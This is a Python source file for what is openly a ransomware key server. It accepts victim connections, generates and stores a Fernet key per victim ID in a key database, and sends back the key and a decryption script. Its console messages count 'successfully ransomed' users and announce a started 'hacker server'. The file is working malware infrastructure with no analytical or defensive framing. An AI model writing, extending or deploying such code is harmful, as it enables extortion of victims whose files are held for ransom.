import os,sys
import socket,threading
from cryptography.fernet import Fernet

def Server_Listen():
    def thread_connect(Sum):
        cipher_key = Fernet.generate_key()
        userrandom = conn.recv(1024).decode("UTF-8")
        print("\n"+"第"+str(Sum)+"名用户被勒索成功:"+userrandom+":"+str(cipher_key))
        userfile = open(os.path.abspath(os.getcwd())+"\\KeyDatabase\\"+userrandom+".txt","a+")
        userfile.write(userrandom+":"+str(cipher_key))
        userfile.close()
        conn.send(b""+cipher_key)
        Clientdecryption = open(os.path.abspath(os.getcwd())+"\\Aop\\Clientdecryption.py","rb")
        Clientdecryptionread = Clientdecryption.read()
        conn.send(Clientdecryptionread)
        Clientdecryption.close()
        conn.close()
    Hacker()
    global Socket
    Socket = socket.socket()
    Socket.bind((sys.argv[2],int(sys.argv[4])))
    Socket.listen(100000) #设置最大连接数
    global conn,addr,Sum
    Sum = 1
    while True:
        conn,addr = Socket.accept()
        Threading = threading.Thread(target=thread_connect,args=(Sum,))
        Threading.start()
        Sum+=1
def main():
    Server_Listen()

def Hacker():
    print("""
The hacker server is started successfully!（Hacker服务器启动成功!）
""")
if __name__ == "__main__":
    main()
